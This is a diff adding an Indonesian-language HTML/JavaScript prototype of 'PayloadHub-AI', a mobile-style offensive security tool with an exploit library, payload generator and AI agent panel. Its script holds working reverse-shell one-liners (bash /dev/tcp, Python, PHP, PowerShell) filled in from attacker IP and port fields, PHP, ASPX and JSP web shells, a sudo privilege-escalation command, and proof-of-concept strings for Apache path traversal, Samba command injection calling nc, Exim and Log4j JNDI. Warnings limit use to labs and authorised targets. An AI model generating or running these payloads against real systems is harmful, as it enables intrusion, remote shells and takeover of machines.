@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Purwarupa — PayloadHub-AI</title>
+<style>
+  :root {
+    --bg: #0d1117;
+    --elevated: #161b22;
+    --card: #1f242d;
+    --card-alt: #252a34;
+    --border: #2e3644;
+    --accent: #50fa7b;
+    --warning: #e3b341;
+    --danger: #f85149;
+    --info: #58a6ff;
+    --text: #e6edf3;
+    --muted: #8b949e;
+    --mono: "Cascadia Mono", Consolas, monospace;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 18px;
+    padding: 28px 16px 40px;
+    background: radial-gradient(circle at 20% 0%, #14202b 0%, #080b10 55%);
+    color: var(--text);
+    font-family: "Segoe UI", Roboto, system-ui, sans-serif;
+  }
+  .page-head { text-align: center; }
+  .page-head h1 { margin: 0 0 4px; font-size: 19px; letter-spacing: .2px; }
+  .page-head p { margin: 0; color: var(--muted); font-size: 12px; }
+  .phone {
+    width: 390px;
+    height: 844px;
+    border: 2px solid #30363d;
+    border-radius: 34px;
+    background: var(--bg);
+    position: relative;
+    overflow: hidden;
+    box-shadow: 0 30px 80px rgba(0,0,0,.55), inset 0 0 0 1px #0a0d11;
+    display: flex;
+    flex-direction: column;
+  }
+  .status { height: 34px; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; font-size: 10px; color: var(--muted); flex: none; }
+  .topbar { height: 54px; flex: none; display: flex; align-items: center; gap: 8px; padding: 0 14px; background: var(--elevated); }
+  .topbar h2 { font-size: 16px; margin: 0; flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .round {
+    width: 34px; height: 34px; border-radius: 50%; border: 1px solid var(--border);
+    background: var(--card); color: var(--muted); display: grid; place-items: center;
+    font-size: 14px; cursor: pointer; flex: none; transition: .15s;
+  }
+  .round:hover { color: var(--accent); border-color: var(--accent); }
+  .screen { flex: 1; overflow-y: auto; padding: 14px; padding-bottom: 90px; display: none; scrollbar-width: thin; }
+  .screen.active { display: block; }
+  .screen::-webkit-scrollbar { width: 4px; }
+  .screen::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+  .card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 14px; margin-bottom: 14px; }
+  .card h3 { margin: 0 0 2px; font-size: 14px; font-weight: 600; }
+  .card .sub { color: var(--muted); font-size: 10.5px; margin-bottom: 10px; }
+  .row { display: flex; gap: 8px; }
+  .row > * { flex: 1; }
+  label { display: block; font-size: 10px; color: var(--muted); margin-bottom: 4px; }
+  input, select {
+    width: 100%; background: var(--bg); color: var(--text); border: 1px solid var(--border);
+    border-radius: 8px; padding: 9px 10px; font-size: 12px; font-family: inherit; outline: none;
+  }
+  input:focus, select:focus { border-color: var(--accent); }
+  .field { margin-bottom: 11px; }
+  .btn {
+    width: 100%; border: 0; border-radius: 8px; background: var(--accent); color: #0d1117;
+    font-weight: 700; font-size: 12.5px; padding: 12px; cursor: pointer; font-family: inherit;
+  }
+  .btn.secondary { background: var(--card-alt); color: var(--text); border: 1px solid var(--border); font-weight: 500; }
+  .btn:active { transform: translateY(1px); }
+  .chips { display: flex; flex-wrap: wrap; gap: 7px; margin-bottom: 14px; }
+  .chip {
+    padding: 6px 12px; border-radius: 20px; font-size: 10.5px; color: var(--text);
+    background: var(--card); border: 1px solid var(--border); cursor: pointer;
+  }
+  .chip.active { background: var(--accent); color: #0d1117; border-color: var(--accent); font-weight: 700; }
+  .muted { color: var(--muted); }
+  .tiny { font-size: 10px; }
+  .code {
+    background: #0a0e13; border: 1px solid var(--border); border-radius: 8px;
+    font-family: var(--mono); font-size: 11px; line-height: 1.55; padding: 12px;
+    white-space: pre-wrap; word-break: break-word; color: var(--text); position: relative;
+  }
+  .code .lang { display: block; color: var(--accent); font-size: 9.5px; margin-bottom: 8px; font-weight: 700; }
+  .copy {
+    position: absolute; top: 8px; right: 10px; color: var(--info); font-size: 10px;
+    background: none; border: 0; cursor: pointer; font-family: inherit;
+  }
+  .error { color: var(--danger); font-size: 10px; margin-top: 4px; display: none; }
+  .error.show { display: block; }
+  .toast {
+    position: absolute; left: 50%; bottom: 82px; transform: translateX(-50%) translateY(20px);
+    background: #173222; border: 1px solid var(--accent); color: var(--accent);
+    padding: 9px 14px; border-radius: 8px; font-size: 10.5px; opacity: 0;
+    pointer-events: none; transition: .25s; white-space: nowrap; z-index: 30;
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+  .nav {
+    position: absolute; bottom: 0; left: 0; right: 0; height: 64px; background: var(--elevated);
+    border-top: 1px solid var(--border); display: flex; justify-content: space-around; align-items: center;
+    padding-bottom: 4px; z-index: 20;
+  }
+  .nav button {
+    background: none; border: 0; color: var(--muted); font-size: 8.5px; font-family: inherit;
+    display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; width: 64px;
+  }
+  .nav button .ico { font-size: 16px; line-height: 1; }
+  .nav button.active { color: var(--accent); }
+  .fab {
+    position: absolute; right: 14px; bottom: 78px; width: 50px; height: 50px; border-radius: 50%;
+    background: var(--accent); color: #0d1117; border: 0; font-weight: 800; font-size: 12px;
+    cursor: pointer; z-index: 21; box-shadow: 0 8px 20px rgba(80,250,123,.25);
+  }
+  .scan { display: flex; align-items: center; gap: 8px; padding: 6px 0; border-bottom: 1px solid rgba(46,54,68,.7); font-size: 10.5px; }
+  .scan:last-child { border-bottom: 0; }
+  .dot { width: 7px; height: 7px; border-radius: 50%; flex: none; }
+  .bar { flex: 1; height: 5px; background: var(--track, #2c333d); border-radius: 3px; overflow: hidden; }
+  .bar i { display: block; height: 100%; border-radius: 3px; }
+  .list-head { display: flex; justify-content: space-between; font-size: 10.5px; color: var(--muted); margin-bottom: 8px; }
+  .metric { display: flex; gap: 8px; margin-bottom: 10px; }
+  .metric div { flex: 1; background: var(--card-alt); border-radius: 7px; padding: 8px; }
+  .metric b { display: block; font-size: 13px; color: var(--text); }
+  .history-item {
+    display: flex; gap: 10px; padding: 10px; background: var(--card); border: 1px solid var(--border);
+    border-radius: 9px; margin-bottom: 9px; cursor: pointer;
+  }
+  .history-item .icon { width: 30px; height: 30px; border-radius: 7px; display: grid; place-items: center; font-family: var(--mono); font-size: 11px; flex: none; }
+  .history-item h4 { margin: 0 0 2px; font-size: 11px; }
+  .history-item p { margin: 0 0 4px; font-size: 9px; color: var(--muted); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 230px; }
+  .badge { font-size: 8px; padding: 2px 6px; border-radius: 4px; border: 1px solid; }
+  .exploit { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 12px; margin-bottom: 10px; cursor: pointer; }
+  .exploit:hover { border-color: var(--accent); }
+  .exploit h4 { margin: 4px 0; font-size: 12.5px; }
+  .exploit p { margin: 0; font-size: 10px; color: var(--muted); }
+  .pill { font-size: 8.5px; padding: 2px 7px; border-radius: 10px; border: 1px solid var(--warning); color: var(--warning); }
+  .sheet {
+    position: absolute; inset: 0; background: rgba(3,6,10,.7); display: none; align-items: flex-end;
+    z-index: 40; backdrop-filter: blur(2px);
+  }
+  .sheet.open { display: flex; }
+  .sheet-body {
+    width: 100%; background: var(--card); border-radius: 18px 18px 0 0; padding: 18px;
+    border-top: 1px solid var(--border); max-height: 76%; overflow-y: auto;
+  }
+  .sheet-body h3 { margin: 0 0 4px; font-size: 15px; }
+  .grabber { width: 42px; height: 4px; background: var(--border); border-radius: 3px; margin: -8px auto 12px; }
+  .fullscreen {
+    position: absolute; inset: 0; background: var(--bg); z-index: 35; display: none;
+    flex-direction: column;
+  }
+  .fullscreen.open { display: flex; }
+  .fs-head { height: 56px; background: var(--elevated); display: flex; align-items: center; gap: 10px; padding: 0 14px; flex: none; }
+  .fs-head h3 { margin: 0; font-size: 14px; }
+  .fs-body { padding: 16px; overflow-y: auto; }
+  .back { background: none; border: 0; color: var(--text); font-size: 18px; cursor: pointer; }
+  .switch { width: 38px; height: 20px; border-radius: 10px; background: var(--bg); border: 1px solid var(--border); position: relative; }
+  .switch i { position: absolute; top: 2px; left: 2px; width: 14px; height: 14px; border-radius: 50%; background: var(--muted); }
+  .switch.on { background: rgba(80,250,123,.18); border-color: var(--accent); }
+  .switch.on i { left: 20px; background: var(--accent); }
+  .toggle-row { display: flex; align-items: center; justify-content: space-between; padding: 7px 0; font-size: 11.5px; }
+  .notice { border: 1px solid var(--warning); background: rgba(227,179,65,.08); border-radius: 8px; padding: 10px; font-size: 9.5px; color: var(--warning); margin-bottom: 12px; }
+  @media (max-width: 430px) {
+    body { padding: 10px 8px 18px; }
+    .phone { width: 100%; max-width: 390px; height: 780px; border-radius: 24px; }
+  }
+</style>
+</head>
+<body>
+  <div class="page-head">
+    <h1>Purwarupa Antarmuka — PayloadHub-AI</h1>
+    <p>Klik navigasi bawah, kartu, dan tombol untuk mencoba alur. Data disimpan di memori purwarupa.</p>
+  </div>
+
+  <div class="phone">
+    <div class="status"><span>9:41</span><span>▮▮▮ 100%</span></div>
+
+    <div class="topbar">
+      <h2 id="title">Dashboard</h2>
+      <button class="round" title="Riwayat aktivitas" onclick="openHistory()">🕘</button>
+      <button class="round" title="Ekspor riwayat" onclick="toast('Riwayat disalin ke clipboard (simulasi)')">💾</button>
+      <button class="round" title="Tentang" onclick="toast('PayloadHub-AI v1.0.0 — gunakan hanya pada target berizin')">👤</button>
+    </div>
+
+    <!-- HOME -->
+    <div class="screen active" id="screen-home">
+      <div class="notice">⚠ Gunakan hanya pada lab, CTF, atau aset yang Anda miliki izin tertulis.</div>
+      <div class="card">
+        <h3>Studio · Payload Configuration</h3>
+        <div class="sub">Konfigurasi cepat untuk agent deterministik</div>
+        <div class="row">
+          <div class="field"><label>OS</label><select><option>Linux</option><option>Windows</option></select></div>
+          <div class="field"><label>Language</label><select><option>Python</option><option>PHP</option><option>Bash</option></select></div>
+        </div>
+        <div class="field"><label>AI Prompt</label><input value="Reverse shell untuk 10.10.14.8:9001" /></div>
+        <button class="btn" onclick="toast('Agent dipanggil — demo tanpa backend')">Run Deterministic Agent</button>
+      </div>
+
+      <div class="card">
+        <h3>Active Attack Surface</h3>
+        <div class="sub">Data scan contoh (bukan scan langsung)</div>
+        <div class="list-head"><span>IP Address</span><span>Service</span><span>Risk</span></div>
+        <div class="scan"><span style="width:88px;font-family:var(--mono)">10.10.14.8</span><span class="dot" style="background:var(--danger)"></span><span style="width:44px">open</span><span class="bar"><i style="width:82%;background:var(--danger)"></i></span></div>
+        <div class="scan"><span style="width:88px;font-family:var(--mono)">10.10.14.22</span><span class="dot" style="background:var(--accent)"></span><span style="width:44px">healthy</span><span class="bar"><i style="width:35%;background:var(--accent)"></i></span></div>
+        <div class="scan"><span style="width:88px;font-family:var(--mono)">10.10.14.14</span><span class="dot" style="background:var(--warning)"></span><span style="width:44px">unknown</span><span class="bar"><i style="width:60%;background:var(--warning)"></i></span></div>
+      </div>
+
+      <div class="card">
+        <h3>Aktivitas Terbaru</h3>
+        <div class="sub">Tersimpan lokal &amp; terenkripsi</div>
+        <div id="recent"></div>
+      </div>
+
+      <div class="card">
+        <h3>Verified Payload Library</h3>
+        <div class="chips" style="margin:10px 0 0">
+          <span class="chip">RCE-Linux</span><span class="chip">SQLi-Error</span>
+          <span class="chip">LFI-Payload</span><span class="chip">XSS-Stored</span>
+          <span class="chip">SSRF-Open</span><span class="chip">SSTI-Jinja</span>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>Threat Intelligence</h3>
+        <div class="sub">VirusTotal · URL, hash, domain, IP</div>
+        <div class="field"><input placeholder="44d88612fea8a8f36de82e1278abb02f" /></div>
+        <button class="btn secondary" onclick="toast('Lookup indikator (butuh API key di Settings)')">Periksa indikator</button>
+      </div>
+      <button class="fab" title="Info Bot" onclick="toast('Info Bot: tanyakan istilah keamanan di sini')">AI</button>
+    </div>
+
+    <!-- EXPLOIT -->
+    <div class="screen" id="screen-exploit">
+      <div class="field"><input placeholder="🔍 CVE / Service / Category..." oninput="filterExploits(this.value)" /></div>
+      <div id="exploit-list"></div>
+    </div>
+
+    <!-- GENERATOR -->
+    <div class="screen" id="screen-generator">
+      <div class="chips">
+        <span class="chip active" onclick="pickCategory(this, 'reverse')">Reverse Shell</span>
+        <span class="chip" onclick="pickCategory(this, 'web')">Web Shell</span>
+        <span class="chip" onclick="pickCategory(this, 'priv')">Privilege Esc.</span>
+      </div>
+      <div class="card">
+        <div class="field"><label>Payload Type</label>
+          <select id="payload-type"><option>bash</option><option>python</option><option>php</option><option>powershell</option></select>
+        </div>
+        <div class="field"><label>LHOST</label><input id="lhost" value="10.10.14.8" /><div class="error" id="ip-error">Masukkan alamat IPv4 yang valid.</div></div>
+        <div class="field"><label>LPORT</label><input id="lport" value="9001" inputmode="numeric" /><div class="error" id="port-error">Port harus antara 1 dan 65535.</div></div>
+        <button class="btn" onclick="generate()">Generate One-Liner</button>
+        <div id="result" style="margin-top:14px"></div>
+      </div>
+      <div class="card">
+        <h3>Custom Python Exploit Builder</h3>
+        <div class="sub">Memerlukan backend FastAPI aktif</div>
+        <div class="field"><label>Target IP</label><input value="10.10.14.8" /></div>
+        <div class="field"><label>Target Port</label><input value="80" /></div>
+        <div class="field"><label>Vulnerable Path</label><input value="/upload.php" /></div>
+        <button class="btn secondary" onclick="toast('Backend tidak terhubung pada purwarupa')">Generate exploit.py (AI)</button>
+      </div>
+    </div>
+
+    <!-- MONITOR -->
+    <div class="screen" id="screen-monitor">
+      <div class="card">
+        <h3>System Telemetry</h3>
+        <div class="sub">Simulasi untuk demonstrasi UI</div>
+        <div class="metric"><div><span class="tiny muted">CPU</span><b>57%</b></div><div><span class="tiny muted">RAM</span><b>71%</b></div><div><span class="tiny muted">NET</span><b>18%</b></div></div>
+        <div class="scan"><span style="width:52px">CPU</span><span class="bar"><i style="width:57%;background:var(--accent)"></i></span></div>
+        <div class="scan"><span style="width:52px">RAM</span><span class="bar"><i style="width:71%;background:var(--info)"></i></span></div>
+        <div class="scan"><span style="width:52px">Network</span><span class="bar"><i style="width:18%;background:var(--warning)"></i></span></div>
+        <div class="scan"><span style="width:52px">Uptime</span><span class="tiny">18h 24m</span></div>
+      </div>
+      <div class="card">
+        <h3>Agent Log</h3>
+        <div class="code"><span class="lang">events</span>13:45:02  tool  generate_reverse_shell  ok
+13:45:03  tool  validate_ipv4            ok
+13:45:03  agent response ready (1.8s)</div>
+      </div>
+    </div>
+
+    <!-- SETTINGS -->
+    <div class="screen" id="screen-settings">
+      <div class="card">
+        <h3>API Configuration</h3>
+        <div class="sub">Disimpan terenkripsi di perangkat</div>
+        <div class="field"><label>DeepSeek API Key</label><input type="password" value="sk-demo-key-not-real" /></div>
+        <div class="field"><label>VirusTotal API Key</label><input type="password" placeholder="belum diisi" /></div>
+      </div>
+      <div class="card">
+        <h3>Target Defaults</h3>
+        <div class="sub">Dipakai otomatis oleh generator</div>
+        <div class="row">
+          <div class="field"><label>LHOST</label><input value="10.10.14.8" /></div>
+          <div class="field"><label>LPORT</label><input value="9001" /></div>
+        </div>
+      </div>
+      <div class="card">
+        <h3>Theme &amp; UI Tweaks</h3>
+        <div class="toggle-row">Glow effects <span class="switch on" onclick="this.classList.toggle('on')"><i></i></span></div>
+        <div class="toggle-row">Terminal font <span class="switch" onclick="this.classList.toggle('on')"><i></i></span></div>
+        <div class="toggle-row">Sound effects <span class="switch" onclick="this.classList.toggle('on')"><i></i></span></div>
+      </div>
+      <button class="btn" onclick="toast('Pengaturan disimpan (simulasi)')">Save Settings</button>
+    </div>
+
+    <!-- HISTORY (pushed route simulation) -->
+    <div class="screen" id="screen-history">
+      <div class="sub muted" style="display:flex;justify-content:space-between;margin-bottom:10px">
+        <span>Riwayat lokal terenkripsi</span>
+        <span style="color:var(--danger);cursor:pointer" onclick="clearHistory()">Hapus semua</span>
+      </div>
+      <div id="history-list"></div>
+    </div>
+
+    <nav class="nav">
+      <button class="active" data-screen="home" onclick="go('home', this)"><span class="ico">▤</span>Home</button>
+      <button data-screen="exploit" onclick="go('exploit', this)"><span class="ico">▣</span>Exploit</button>
+      <button data-screen="generator" onclick="go('generator', this)"><span class="ico">&gt;_</span>Generator</button>
+      <button data-screen="monitor" onclick="go('monitor', this)"><span class="ico">◉</span>Monitor</button>
+      <button data-screen="settings" onclick="go('settings', this)"><span class="ico">⚙</span>Settings</button>
+    </nav>
+
+    <div class="toast" id="toast"></div>
+
+    <div class="sheet" id="sheet" onclick="if(event.target===this)closeSheet()">
+      <div class="sheet-body">
+        <div class="grabber"></div>
+        <h3 id="sheet-title">Detail</h3>
+        <div class="tiny muted" id="sheet-meta" style="margin-bottom:10px"></div>
+        <div class="code" id="sheet-code"></div>
+        <button class="btn" style="margin-top:12px" onclick="copySheet()">Salin</button>
+      </div>
+    </div>
+
+    <div class="fullscreen" id="fullscreen">
+      <div class="fs-head">
+        <button class="back" onclick="document.getElementById('fullscreen').classList.remove('open')">←</button>
+        <h3 id="fs-title">Detail Exploit</h3>
+      </div>
+      <div class="fs-body" id="fs-body"></div>
+    </div>
+  </div>
+
+<script>
+  const exploits = [
+    { cve: 'CVE-2021-41773', service: 'Apache httpd 2.4.49', desc: 'Path traversal dan remote code execution.', cvss: '9.8', color: 'var(--danger)',
+      poc: 'curl --path-as-is http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' },
+    { cve: 'CVE-2007-2447', service: 'Samba 3.0.20', desc: 'usermap script command injection.', cvss: '9.1', color: 'var(--danger)',
+      poc: 'smbclient //TARGET/tmp -U "noaccess%`nc LHOST 9001`"' },
+    { cve: 'CVE-2019-10149', service: 'Exim 4.89', desc: 'Remote command execution via MAIL FROM.', cvss: '9.8', color: 'var(--warning)',
+      poc: 'MAIL FROM:<${run{/bin/sh -c "id"}}@localhost>' },
+    { cve: 'CVE-2021-44228', service: 'Log4j 2.x', desc: 'JNDI lookup remote code execution.', cvss: '10.0', color: 'var(--danger)',
+      poc: '${jndi:ldap://LHOST:1389/Exploit}' }
+  ];
+  let history = [
+    { title: 'Reverse Shell · bash', detail: 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1', kind: 'Payload', color: 'var(--accent)', icon: '>_' },
+    { title: 'Python exploit · 10.10.14.8:80', detail: 'exploit.py — requests + argparse', kind: 'Exploit', color: 'var(--warning)', icon: '{}' }
+  ];
+  let category = 'reverse';
+
+  function toast(message) {
+    const el = document.getElementById('toast');
+    el.textContent = message;
+    el.classList.add('show');
+    clearTimeout(el._timer);
+    el._timer = setTimeout(() => el.classList.remove('show'), 2200);
+  }
+
+  function go(screen, button) {
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    document.getElementById('screen-' + screen).classList.add('active');
+    document.querySelectorAll('.nav button').forEach(b => b.classList.toggle('active', b === button));
+    const titles = { home: 'Dashboard', exploit: 'Exploit Library', generator: 'Script Generator', monitor: 'Monitoring', settings: 'Settings', history: 'Riwayat Aktivitas' };
+    document.getElementById('title').textContent = titles[screen] || 'PayloadHub-AI';
+    document.querySelector('.fab')?.remove?.();
+  }
+
+  function openHistory() {
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    document.getElementById('screen-history').classList.add('active');
+    document.getElementById('title').textContent = 'Riwayat Aktivitas';
+    document.querySelectorAll('.nav button').forEach(b => b.classList.remove('active'));
+    renderHistory();
+  }
+
+  function pickCategory(el, value) {
+    category = value;
+    document.querySelectorAll('#screen-generator .chip').forEach(c => c.classList.remove('active'));
+    el.classList.add('active');
+    const map = { reverse: ['bash', 'python', 'php', 'powershell'], web: ['php', 'aspx', 'jsp'], priv: ['sudo-python', 'find', 'vim', 'python'] };
+    const select = document.getElementById('payload-type');
+    select.innerHTML = map[value].map(t => `<option>${t}</option>`).join('');
+  }
+
+  function isIpv4(value) {
+    return /^(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}$/.test(value.trim());
+  }
+
+  function generate() {
+    const ip = document.getElementById('lhost').value.trim();
+    const port = document.getElementById('lport').value.trim();
+    const type = document.getElementById('payload-type').value;
+    const ipOk = category !== 'reverse' || isIpv4(ip);
+    const portOk = category !== 'reverse' || (/^\d+$/.test(port) && +port >= 1 && +port <= 65535);
+    document.getElementById('ip-error').classList.toggle('show', !ipOk);
+    document.getElementById('port-error').classList.toggle('show', !portOk);
+    if (!ipOk || !portOk) return;
+
+    let code = '';
+    if (category === 'reverse') {
+      if (type === 'bash') code = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
+      else if (type === 'python') code = `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'`;
+      else if (type === 'php') code = `php -r '$s=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
+      else code = `powershell -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('${ip}',${port});..."`;
+    } else if (category === 'web') {
+      code = type === 'aspx'
+        ? '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["c"]); %>'
+        : type === 'jsp' ? '<% Runtime.getRuntime().exec(request.getParameter("c")); %>'
+        : '<?php system($_GET["c"]); ?>';
+    } else {
+      code = 'sudo -l\nsudo python3 -c \'import os;os.setuid(0);os.system("/bin/sh")\'';
+    }
+
+    document.getElementById('result').innerHTML =
+      `<div class="tiny muted" style="margin-bottom:6px">Generated Payload</div>
+       <div class="code"><button class="copy" onclick="copyText(this)">Salin</button><span class="lang">${type}</span>${escapeHtml(code)}</div>`;
+
+    history.unshift({ title: `Reverse Shell · ${type}`, detail: code, kind: 'Payload', color: 'var(--accent)', icon: '>_' });
+    renderRecent();
+    toast('Payload dibuat dan disimpan ke riwayat');
+  }
+
+  function escapeHtml(value) {
+    return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  }
+
+  function copyText(button) {
+    const code = button.parentElement.innerText.replace(/^Salin\s*/, '').replace(/^[a-z]+\s*\n/, '');
+    navigator.clipboard?.writeText(code);
+    toast('Disalin ke clipboard');
+  }
+
+  function renderRecent() {
+    const target = document.getElementById('recent');
+    if (!target) return;
+    target.innerHTML = history.slice(0, 3).map((item, index) => `
+      <div class="scan" style="cursor:pointer" onclick="showDetail(${index})">
+        <span style="color:${item.color};width:16px">${item.icon}</span>
+        <span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escapeHtml(item.title)}</span>
+        <span class="muted">›</span>
+      </div>`).join('') +
+      `<div class="tiny" style="text-align:right;margin-top:8px;color:var(--accent);cursor:pointer" onclick="openHistory()">Lihat semua</div>`;
+  }
+
+  function renderHistory() {
+    const list = document.getElementById('history-list');
+    list.innerHTML = history.map((item, index) => `
+      <div class="history-item" onclick="showDetail(${index})">
+        <div class="icon" style="border:1px solid ${item.color};color:${item.color}">${item.icon}</div>
+        <div style="flex:1">
+          <h4>${escapeHtml(item.title)}</h4>
+          <p>${escapeHtml(item.detail.replace(/\n/g, ' '))}</p>
+          <span class="badge" style="color:${item.color};border-color:${item.color}">${item.kind}</span>
+        </div>
+      </div>`).join('') || '<div class="card muted">Belum ada aktivitas.</div>';
+  }
+
+  function showDetail(index) {
+    const item = history[index];
+    document.getElementById('sheet-title').textContent = item.title;
+    document.getElementById('sheet-meta').textContent = `${item.kind} · hari ini`;
+    document.getElementById('sheet-code').textContent = item.detail;
+    document.getElementById('sheet').classList.add('open');
+  }
+
+  function closeSheet() { document.getElementById('sheet').classList.remove('open'); }
+
+  function copySheet() {
+    navigator.clipboard?.writeText(document.getElementById('sheet-code').textContent);
+    toast('Disalin ke clipboard');
+  }
+
+  function clearHistory() {
+    history = [];
+    renderHistory();
+    renderRecent();
+    toast('Riwayat lokal dihapus');
+  }
+
+  function filterExploits(query) {
+    renderExploits(query.toLowerCase());
+  }
+
+  function renderExploits(query = '') {
+    const list = document.getElementById('exploit-list');
+    const filtered = exploits.filter(e => (e.cve + e.service + e.desc).toLowerCase().includes(query));
+    list.innerHTML = filtered.map((e, i) => `
+      <div class="exploit" onclick="openExploit(${exploits.indexOf(e)})">
+        <div style="display:flex;justify-content:space-between;align-items:center">
+          <b style="font-size:10px;color:${e.color}">${e.cve}</b>
+          <span class="pill">CVSS ${e.cvss}</span>
+        </div>
+        <h4>${e.service}</h4>
+        <p>${e.desc}</p>
+      </div>`).join('') || '<div class="card muted">Tidak ada exploit yang cocok.</div>';
+  }
+
+  function openExploit(index) {
+    const e = exploits[index];
+    document.getElementById('fs-title').textContent = e.cve;
+    document.getElementById('fs-body').innerHTML = `
+      <h2 style="color:var(--accent);font-size:18px;margin:0 0 4px">${e.cve}</h2>
+      <div style="font-size:13px;margin-bottom:10px">${e.service}</div>
+      <div class="metric">
+        <div><span class="tiny muted">CVSS</span><b style="color:${e.color}">${e.cvss}</b></div>
+        <div><span class="tiny muted">Kategori</span><b>Web / RCE</b></div>
+      </div>
+      <p class="muted" style="font-size:11px;line-height:1.5">${e.desc} Gunakan hanya pada sistem yang memiliki otorisasi.</p>
+      <div class="tiny muted" style="margin:12px 0 6px">Proof of Concept</div>
+      <div class="code">${escapeHtml(e.poc)}</div>
+      <button class="btn" style="margin-top:14px" onclick="toast('Exploit dikirim ke Studio');document.getElementById('fullscreen').classList.remove('open');go('home', document.querySelector('.nav button'))">Send to Studio</button>`;
+    document.getElementById('fullscreen').classList.add('open');
+  }
+
+  renderExploits();
+  renderRecent();
+  renderHistory();
+</script>
+</body>
+</html>
